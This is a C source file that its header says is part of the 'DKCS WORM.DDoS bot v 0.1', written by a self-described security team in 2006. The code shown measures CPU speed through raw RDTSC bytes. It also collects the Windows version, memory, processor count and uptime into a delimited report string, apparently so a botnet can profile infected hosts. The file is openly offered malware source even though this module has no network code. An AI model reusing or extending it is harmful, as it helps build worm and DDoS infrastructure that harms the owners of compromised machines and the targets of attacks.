//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
unsigned __int64 cyclecount(void){
	_asm{
		_emit 0x0F;
		_emit 0x31;
	}
}
//-----------------------------------------------------------------
int cpuspeed(void){

	unsigned __int64	startcycle;
	unsigned __int64	speed;
	unsigned __int64	num;
	unsigned __int64	num2;

	do{
        startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	}while(speed > 1000000);
	num = speed % 100;
	num2 = 100;
	if(num < 80){
		num2 = 75;
	}
	if(num < 71){
		num2 = 66;
	}
	if(num < 55){
		num2 = 50;
	}
	if(num < 38){
		num2 = 33;
	}
	if(num < 30){
		num2 = 25;
	}
	if(num < 10){
		num2 = 0;
	}
	speed = (speed-num)+num2;
return (int)speed;
}
//-----------------------------------------------------------------
struct SYS_INFO{
	char	buff[256];
};
//-----------------------------------------------------------------
SYS_INFO GetSysInfo(void){

	MEMORYSTATUS	memstat;
	OSVERSIONINFO	verinfo;
	DWORD			days;
	DWORD			hours;
	DWORD			minutes;
	DWORD			total;
	SYSTEM_INFO		CpuInfo;
	SYS_INFO		data;
	char			*os;
	char			os2[140];

	GlobalMemoryStatus(&memstat);
	GetSystemInfo(&CpuInfo);
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo);
	if(verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT){
			os = "NT";
		}
	}else{
		if(verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0){
			os = "2000";
		}else{
			if(verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1){
				os = "XP";
			}else{
				os = "Unkown";
			}
		}
	}
	if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}
	total = (GetTickCount() / 1000);
	days = total / 86400;
	hours = (total % 86400) / 3600;
	minutes = ((total % 86400) % 3600) / 60;
	wsprintf(data.buff, " Operating system: Windows %s@ Memory: %d/%dMB@ CPU: %dMHz with %d processor(s)@ Uptime: %d day, %d hour, and %d minute@", os, ((memstat.dwAvailPhys / 1024) / 1024), ((memstat.dwTotalPhys / 1024) / 1024), cpuspeed(), CpuInfo.dwNumberOfProcessors, days, hours, minutes);
return data;
}
//-----------------------------------------------------------------